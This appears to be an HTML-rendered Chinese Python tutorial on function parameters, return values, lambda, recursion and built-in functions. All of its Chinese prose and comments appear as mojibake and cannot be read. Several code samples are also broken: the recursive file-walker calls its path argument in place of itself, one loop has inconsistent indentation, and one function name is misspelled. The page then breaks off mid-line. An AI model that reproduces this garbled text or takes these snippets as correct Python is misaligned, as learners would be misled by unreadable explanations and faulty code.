<h6 id="å¿…é€‰å‚æ•°"><a href="#å¿…é€‰å‚æ•°" class="headerlink" title="#å¿…é€‰å‚æ•°"></a>#å¿…é€‰å‚æ•°</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a,b</span>):</span>  </span><br><span class="line">    <span class="comment">#a,bä¸ºå½¢å‚ï¼Œåœ¨å®šä¹‰çš„æ—¶å€™ä¸å å†…å­˜åœ°å€</span></span><br><span class="line">    <span class="built_in">sum</span> = a + b</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">a,b = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">sum</span>(a,b) <span class="comment">#è°ƒç”¨å‚æ•° è¿™é‡Œçš„a,bæ˜¯å®å‚ï¼Œå ç”¨å†…å­˜åœ°å€</span></span><br><span class="line"><span class="built_in">sum</span>()  <span class="comment">#ç›´æ¥è°ƒç”¨ä¼šæŠ¥é”™ï¼Œå¿…é¡»è¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå› æ­¤æ˜¯å¿…é€‰å‚æ•°</span></span><br></pre></td></tr></table></figure>

<h6 id="é»˜è®¤å‚æ•°"><a href="#é»˜è®¤å‚æ•°" class="headerlink" title="#é»˜è®¤å‚æ•°"></a>#é»˜è®¤å‚æ•°</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å§‹ç»ˆå­˜åœ¨äºå‚æ•°åˆ—è¡¨ä¸­çš„å°¾éƒ¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a=<span class="number">20</span>,b=<span class="number">30</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;é»˜è®¤å‚æ•°çš„ä½¿ç”¨=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a+b))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">sum</span>()  <span class="comment">#å¯ç›´æ¥è°ƒç”¨ï¼Œè‹¥æœ‰å‚æ•°çš„æ—¶å€™å¯¹ä¸ªæ•°ä¸å¼ºåˆ¶ï¼Œä½†å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°çš„æ—¶å€™é»˜è®¤èµ‹å€¼ç»™å‰é¢çš„å½¢å‚</span></span><br></pre></td></tr></table></figure>

<h6 id="å¯é€‰å‚æ•°ï¼ˆä¸å®šé•¿å‚æ•°"><a href="#å¯é€‰å‚æ•°ï¼ˆä¸å®šé•¿å‚æ•°" class="headerlink" title="#å¯é€‰å‚æ•°ï¼ˆä¸å®šé•¿å‚æ•°"></a>#å¯é€‰å‚æ•°ï¼ˆä¸å®šé•¿å‚æ•°</h6><p><em>æ¥å—çš„æ•°æ®æ˜¯ä¸€ä¸ªå…ƒç»„ç±»å‹</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å½“å‚æ•°çš„ä¸ªæ•°ä¸ç¡®å®šæ—¶ä½¿ç”¨ï¼Œæ¯”è¾ƒçµæ´»</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    å¯å˜é•¿çš„å‚æ•°ç±»å‹</span></span><br><span class="line"><span class="string">    ç´¯åŠ </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">sum</span>(<span class="number">1</span>)  </span><br><span class="line"><span class="built_in">sum</span>(<span class="number">1</span>,<span class="number">2</span>)  <span class="comment">#ä»¥å…ƒç»„å½¢å¼è¿›è¡Œè¾“å‡º</span></span><br><span class="line"><span class="comment">#forå¾ªç¯å®ç°å¤šå‚æ•°éå†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">	<span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">   	 	<span class="keyword">for</span> i <span class="keyword">in</span> args:</span><br><span class="line">        	<span class="built_in">sum</span> += i</span><br><span class="line">        	<span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h6 id="å…³é”®å­—å¯å˜å‚æ•°"><a href="#å…³é”®å­—å¯å˜å‚æ•°" class="headerlink" title="#å…³é”®å­—å¯å˜å‚æ•°"></a>#å…³é”®å­—å¯å˜å‚æ•°</h6><p><em>æ¥å—çš„æ•°æ®æ˜¯å­—å…¸ç±»å‹</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  ** æ¥å®šä¹‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨å‡½æ•°ä½“å†… å‚æ•°å…³é”®å­—æ˜¯ä¸€ä¸ªå­—å…¸ç±»å‹ï¼Œkeyæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyFunc</span>(<span class="params">**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">keyFunct(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="comment">#æŠ¥é”™</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;11&#x27;</span>&#125;</span><br><span class="line">keyFunc() <span class="comment">#ç©ºå­—å…¸</span></span><br><span class="line">keyFunc(**a)  <span class="comment">#ç›´æ¥ä¼ å­—å…¸çš„æ—¶å€™è¦åŠ ä¸Š **</span></span><br><span class="line">keyFunc(name=<span class="string">&#x27;peter&#x27;</span>,age=<span class="number">18</span>) <span class="comment">#åº”è¯¥ä»¥é”®å€¼å¯¹çš„å½¢å¼ä¼ å‚</span></span><br></pre></td></tr></table></figure>

<h6 id="ç»„åˆä½¿ç”¨"><a href="#ç»„åˆä½¿ç”¨" class="headerlink" title="#ç»„åˆä½¿ç”¨"></a>#ç»„åˆä½¿ç”¨</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comx1</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">comx1(age=<span class="number">18</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯é€‰å‚æ•°å¿…é¡»æ”¾åœ¨å…³é”®å­—å¯é€‰å‚æ•°ä¹‹å‰</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-å‡½æ•°è¿”å›å€¼"><a href="#0x03-å‡½æ•°è¿”å›å€¼" class="headerlink" title="0x03:å‡½æ•°è¿”å›å€¼"></a>0x03:å‡½æ•°è¿”å›å€¼</h5><p>*å‡½æ•°éœ€è¦è¿”å›å¤šä¸ªç»“æœæ—¶ï¼Œå°†è¦è¿”å›çš„å€¼ç”¨é€—å·éš”å¼€ï¼Œæœ€ç»ˆä¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰è¿”å›å€¼çš„å…ƒç»„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å‡½æ•°æ‰§è¡Œå®Œä»¥åä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœå‡½æ•°çš„å†…éƒ¨æœ‰returnè¿™ä¸ªå…³é”®å­—ï¼Œå°±å¯ä»¥è¿”å›å®é™…çš„å€¼ï¼Œå¦åˆ™è¿”å›None</span><br><span class="line">2.å¯ä»¥è¿”å›ä»»æ„ç±»å‹ï¼Œå–å†³äºreturnå…³é”®å­—åé¢çš„å…ƒç´ çš„ç±»å‹</span><br><span class="line">3.ç»™è°ƒç”¨æ–¹è¿”å›æ•°æ®</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="built_in">sum</span> = a+b</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line">a,b = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a+b=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">sum</span>(a,b)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanshu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(hanshu())  <span class="comment">#ä»¥å…ƒç»„ç±»å‹è¾“å‡º</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanshu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(hanshu())  <span class="comment">#ä»¥å­—å…¸ç±»å‹è¾“å‡º</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(hanshu()))  <span class="comment">#å­—å…¸</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-å‡½æ•°åµŒå¥—"><a href="#0x04-å‡½æ•°åµŒå¥—" class="headerlink" title="0x04:å‡½æ•°åµŒå¥—"></a>0x04:å‡½æ•°åµŒå¥—</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----start------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----æ‰§è¡Œä»£ç çœç•¥-----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----end-----&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----start-----&quot;</span>)</span><br><span class="line">    fun1()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----end-----&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨è°ƒç”¨fun2å‡½æ•°çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°fun1å‡½æ•°ï¼Œfun1å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åç»§ç»­æ‰§è¡Œä¹‹åçš„ä»£ç </span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡½æ•°åˆ†ç±»ï¼š</span><br><span class="line">æœ‰å‚æ•°æ— è¿”å›å€¼</span><br><span class="line">æœ‰å‚æ•°æœ‰è¿”å›å€¼</span><br><span class="line">æ— å‚æ•°æ— è¿”å›å€¼</span><br><span class="line">æ— å‚æ•°æœ‰è¿”å›å€¼</span><br></pre></td></tr></table></figure>

<h3 id="5-å‡½æ•°è¿›é˜¶"><a href="#5-å‡½æ•°è¿›é˜¶" class="headerlink" title="5.å‡½æ•°è¿›é˜¶"></a>5.å‡½æ•°è¿›é˜¶</h3><h5 id="0x01-å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡"><a href="#0x01-å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡" class="headerlink" title="0x01:å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡"></a>0x01:å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡</h5><p><strong>å±€éƒ¨å˜é‡ï¼š</strong></p>
<p>å‡½æ•°å†…éƒ¨å®šä¹‰çš„å˜é‡ï¼ˆç”Ÿæ•ˆèŒƒå›´åªåœ¨å‡½æ•°çš„å†…éƒ¨ï¼Œä¸åŒçš„å‡½æ•°å¯ä»¥å®šä¹‰ç›¸åŒçš„å±€éƒ¨å˜é‡äº’ä¸å¹²æ‰°ï¼Œå±€éƒ¨å˜é‡ä¸ºäº†ä¸´æ—¶çš„ä¿å­˜æ•°æ®ï¼Œéœ€è¦åœ¨å‡½æ•°ä¸­å®šä¹‰æ¥è¿›è¡Œå­˜å‚¨</p>
<p><strong>å…¨å±€å˜é‡ï¼š</strong></p>
<p>å½“å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡å‡ºç°é‡å¤å®šä¹‰çš„æ—¶å€™ï¼Œç¨‹åºä¼šä¼˜å…ˆæ‰§è¡Œä½¿ç”¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„å˜é‡</p>
<p>å¦‚æœåœ¨å‡½æ•°çš„å†…éƒ¨æƒ³å¯¹å…¨å±€å˜é‡è¿›è¡Œä¿®æ”¹çš„è¯ï¼Œå¿…é¡»ä½¿ç”¨globalå…³é”®å­—è¿›è¡Œå£°æ˜</p>
<p>ä¿®æ”¹å…¨å±€å˜é‡ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeGlobal</span>():</span></span><br><span class="line">	<span class="keyword">global</span> name</span><br><span class="line">	name = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">changeGlobal()</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h5 id="0x02-å‡½æ•°å‚æ•°å¼•ç”¨ä¼ å€¼"><a href="#0x02-å‡½æ•°å‚æ•°å¼•ç”¨ä¼ å€¼" class="headerlink" title="0x02:å‡½æ•°å‚æ•°å¼•ç”¨ä¼ å€¼"></a>0x02:å‡½æ•°å‚æ•°å¼•ç”¨ä¼ å€¼</h5><p><strong>ä¸å¯å˜ç±»å‹</strong></p>
<p>int str å…ƒç»„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;açš„åœ°å€ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;xçš„åœ°å€ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(x)))</span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;xçš„åœ°å€ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(x)))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">func(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;açš„åœ°å€ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># açš„åœ°å€ï¼š140706376876304</span></span><br><span class="line"><span class="comment"># xçš„åœ°å€ï¼š140706376876304</span></span><br><span class="line"><span class="comment"># xçš„åœ°å€ï¼š140706376876336</span></span><br><span class="line"><span class="comment"># 1</span></span><br></pre></td></tr></table></figure>

<p><strong>å¯å˜ç±»å‹</strong></p>
<p>å­—å…¸ åˆ—è¡¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">listA = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">parms</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(parms))</span><br><span class="line">    parms.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(parms))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;å†…éƒ¨çš„&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(parms))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(listA))</span><br><span class="line">func(listA)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å¤–éƒ¨çš„&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(listA))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># å†…éƒ¨çš„[[1, 2, 3, 4]] </span></span><br><span class="line"><span class="comment"># å¤–éƒ¨çš„[[1, 2, 3, 4]]  æ•°æ®åŒæ­¥å˜åŒ–</span></span><br></pre></td></tr></table></figure>

<p><strong>å°ç»“</strong></p>
<p>1.åœ¨pythonä¸­ ä¸‡ç‰©çš†å¯¹è±¡ï¼Œåœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œå®å‚ä¼ é€’çš„å°±æ˜¯å¯¹è±¡çš„å¼•ç”¨</p>
<p>2.æ›´å¥½çš„æŠŠæ§ åœ¨å‡½æ•°å†…éƒ¨çš„å¤„ç†æ˜¯å¦ä¼šå½±å“å‡½æ•°å¤–éƒ¨æ•°æ®çš„å˜åŒ–</p>
<p>3.å‚æ•°ä¼ é€’æ˜¯é€šè¿‡å¯¹è±¡å¼•ç”¨æ¥å®Œæˆ</p>
<h5 id="0x03-åŒ¿åå‡½æ•°"><a href="#0x03-åŒ¿åå‡½æ•°" class="headerlink" title="0x03:åŒ¿åå‡½æ•°"></a>0x03:åŒ¿åå‡½æ•°</h5><p>åˆ©ç”¨<code>lambda</code>å…³é”®å­—åˆ›å»ºåŒ¿åå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lambda å‚æ•°1,å‚æ•°2,å‚æ•°3:æ‰§è¡Œä»£ç è¯­å¥</span><br></pre></td></tr></table></figure>

<p>1.æ²¡æœ‰åå­—çš„å‡½æ•°</p>
<p>2.åŒ¿åå‡½æ•°å†’å·åé¢çš„è¡¨è¾¾å¼æœ‰ä¸”åªæœ‰ä¸€ä¸ªï¼ˆæ˜¯è¡¨è¾¾å¼ï¼Œä¸æ˜¯è¯­å¥</p>
<p>3.åŒ¿åå‡½æ•°è‡ªå¸¦<code>return</code></p>
<p>4.ç”¨å˜é‡æ¥æ”¶åŒ¿åå‡½æ•°ï¼Œç”¨å˜é‡è¿›è¡Œè°ƒç”¨</p>
<p>5.ä½†æ˜¯åªèƒ½æ˜¯å•ä¸ªè¡¨è¾¾å¼ï¼Œä¸æ˜¯ä¸€ä¸ªä»£ç å—ï¼Œåªæ˜¯ä¸ºäº†æ»¡è¶³ç®€å•å‡½æ•°çš„åœºæ™¯ï¼Œä»…ä»…èƒ½å°è£…æœ‰é™çš„é€»è¾‘ï¼Œå¤æ‚é€»è¾‘å®ç°ä¸äº†</p>
<p>egï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="keyword">lambda</span> x,y:x+y</span><br><span class="line"><span class="built_in">print</span>(a(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br><span class="line"></span><br><span class="line">d = <span class="keyword">lambda</span> a,b,c:a*b*c</span><br><span class="line"><span class="built_in">print</span>(d(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br></pre></td></tr></table></figure>

<p>åŒåˆ†æ”¯å˜ä½†åˆ†æ”¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b if a else c</span><br><span class="line">#å¦‚æœaæˆç«‹åˆ™è¿”å›b å¦åˆ™è¿”å›c</span><br></pre></td></tr></table></figure>

<p>ç»“åˆï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç›´æ¥è°ƒç”¨</span></span><br><span class="line">jg = (<span class="keyword">lambda</span> x,y:x <span class="keyword">if</span> x&gt;y <span class="keyword">else</span> y)(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(jg)</span><br></pre></td></tr></table></figure>

<h5 id="0x04-é€’å½’å‡½æ•°"><a href="#0x04-é€’å½’å‡½æ•°" class="headerlink" title="0x04:é€’å½’å‡½æ•°"></a>0x04:é€’å½’å‡½æ•°</h5><p>å¦‚æœä¸€ä¸ªå‡½æ•°åœ¨å†…éƒ¨ä¸è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œè€Œæ˜¯è‡ªå·±æœ¬èº«çš„è¯ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯é€’å½’å‡½æ•°</p>
<p>é€’å½’å‡½æ•°å¿…é¡»æœ‰ä¸€ä¸ªç»“æŸæ¡ä»¶ï¼Œå¦åˆ™é€’å½’æ— æ³•ç»“æŸ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ±‚é˜¶ä¹˜</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x * func(x-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(func(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¨¡æ‹Ÿæ–‡ä»¶æŸ¥æ‰¾ å®ç°æ ‘å½¢ç»“æ„çš„éå†</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os <span class="comment">#å¼•å…¥æ–‡ä»¶æ“ä½œæ¨¡å—</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findFile</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    listRs = os.listdir(file_path) <span class="comment">#å¾—åˆ°è¯¥è·¯å¾„ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å¤¹</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> listRs:</span><br><span class="line">        full_path = os.path.join(file_path, item)</span><br><span class="line">        <span class="comment">#è·å–å®Œæ•´çš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(full_path):</span><br><span class="line">        <span class="comment">#åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹</span></span><br><span class="line">        	file_path(full_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>1.è‡ªå·±è°ƒç”¨è‡ªå·±</p>
<p>2.å¿…é¡»æœ‰ä¸€ä¸ªæ˜ç¡®çš„ç»“æŸæ¡ä»¶</p>
<p>3.ä¼˜ç‚¹ï¼šé€»è¾‘ç®€å•ï¼Œå®šä¹‰ç®€å•</p>
<p>4.ç¼ºç‚¹ï¼šå®¹æ˜“å¯¼è‡´æ ˆæº¢å‡ºã€‚å†…å­˜èµ„æºç´§å¼ ï¼Œç”šè‡³å†…å­˜æ³„æ¼</p>
<h3 id="6-å†…ç½®å‡½æ•°"><a href="#6-å†…ç½®å‡½æ•°" class="headerlink" title="6.å†…ç½®å‡½æ•°"></a>6.å†…ç½®å‡½æ•°</h3><h5 id="0x01-æ•°å­¦è¿ç®—"><a href="#0x01-æ•°å­¦è¿ç®—" class="headerlink" title="0x01:æ•°å­¦è¿ç®—"></a>0x01:æ•°å­¦è¿ç®—</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abs()  æ±‚ç»å¯¹å€¼å‡½æ•°</span><br><span class="line">è¿”å›æ•°å­—çš„ç»å¯¹å€¼</span><br><span class="line"></span><br><span class="line">round()</span><br><span class="line">æ±‚è¿‘ä¼¼å€¼</span><br><span class="line"></span><br><span class="line">pow()</span><br><span class="line">æ±‚æ¬¡æ–¹</span><br><span class="line"></span><br><span class="line">divmod()</span><br><span class="line">æ±‚å•†å’Œä½™æ•°</span><br><span class="line"></span><br><span class="line">max()</span><br><span class="line">min()</span><br><span class="line">æœ€å€¼</span><br><span class="line"></span><br><span class="line">sum()</span><br><span class="line">å’Œ</span><br><span class="line"></span><br><span class="line">eval()</span><br><span class="line">å°†å­—ç¬¦ä¸²å½“ä½œä»£ç </span><br></pre></td></tr></table></figure>

<h5 id="0x02-ç±»å‹è½¬æ¢"><a href="#0x02-ç±»å‹è½¬æ¢" class="headerlink" title="0x02:ç±»å‹è½¬æ¢"></a>0x02:ç±»å‹è½¬æ¢</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æ•°æ®ç±»å‹çš„è½¬æ¢</span><br><span class="line">int()</span><br><span class="line">float()</span><br><span class="line">str()</span><br><span class="line"></span><br><span class="line">#asciiç ç›¸äº’è½¬æ¢</span><br><span class="line">ord()</span><br><span class="line">chr() </span><br><span class="line"></span><br><span class="line">bool()</span><br><span class="line"></span><br><span class="line">bin()</span><br><span class="line">hex()</span><br><span class="line">oct() è½¬æˆå…«è¿›åˆ¶</span><br><span class="line"></span><br><span class="line">list() å…ƒç»„è½¬æ¢æˆåˆ—è¡¨</span><br><span class="line">tuple()</span><br><span class="line">dict() åˆ›å»ºå­—å…¸</span><br><span class="line"></span><br><span class="line">bytes()</span><br></pre></td></tr></table></figure>

<p><code>dict()</code>å­—å…¸æ“ä½œï¼ˆä¸»è¦ç”¨äºåˆ›å»ºå­—å…¸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¯­æ³•</span></span><br><span class="line"><span class="comment"># class dict(**kwarg)</span></span><br><span class="line"><span class="comment"># class dict(mapping,**kwarg)</span></span><br><span class="line"><span class="comment"># class dict(iterable,**kwarg)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å‚æ•°</span></span><br><span class="line"><span class="comment"># **kwarg  å…³é”®å­—</span></span><br><span class="line"><span class="comment"># mapping å…ƒç´ çš„å®¹å™¨</span></span><br><span class="line"><span class="comment"># iterable å¯è¿­ä»£å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿”å›å€¼</span></span><br><span class="line"><span class="comment">#è¿”å›ä¸€ä¸ªå­—å…¸</span></span><br><span class="line"></span><br><span class="line">dic = <span class="built_in">dict</span>(name=<span class="string">&#x27;cookie&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(dic))</span><br><span class="line">dic.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;)  <span class="comment">#æ›´æ–°æ•°æ®æˆ–è€…å¢åŠ æ•°æ®</span></span><br><span class="line">dic[<span class="string">&#x27;age&#x27;</span>] = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure>

<p><code>bytes()</code>è½¬ä¸ºå­—èŠ‚æ•°ç»„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¯­æ³•</span></span><br><span class="line"><span class="comment"># class bytearray([source[,encoding]]])</span></span><br><span class="line"><span class="comment">#å‚æ•°</span></span><br><span class="line"><span class="comment"># source ä¸ºæ•´æ•°ï¼Œåˆ™è¿”å›ä¸€ä¸ªé•¿åº¦ä¸ºsourceçš„åˆå§‹åŒ–æ•°ç»„</span></span><br><span class="line"><span class="comment">#        ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™æŒ‰ç…§æŒ‡å®šçš„encodingå°†å­—ç¬¦ä¸²è½¬æ¢æˆå­—èŠ‚åºåˆ—</span></span><br><span class="line"><span class="comment">#        ä¸ºå¯è¿­ä»£ç±»å‹ï¼Œåˆ™å…ƒç´ å¿…é¡»ä¸º[0,255]ä¸­çš„æ•´æ•°</span></span><br><span class="line"><span class="comment">#        ä¸ºä¸bufferæ¥å£ä¸€è‡´çš„å¯¹è±¡ï¼Œåˆ™æ¬¡å¯¹è±¡ä¹Ÿå¯ä»¥è¢«ç”¨äºåˆå§‹åŒ–bytes</span></span><br><span class="line"><span class="comment">#        å¦‚æœæ²¡æœ‰è¾“å…¥ä»»ä½•å‚æ•°ï¼Œé»˜è®¤å°±æ˜¯åˆå§‹åŒ–æ•°ç»„ä¸º0ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="comment">#è¿”å›å€¼</span></span><br><span class="line"><span class="comment">#è¿”å›æ–°å­—èŠ‚æ•°ç»„</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(<span class="string">&#x27;wæˆ‘like 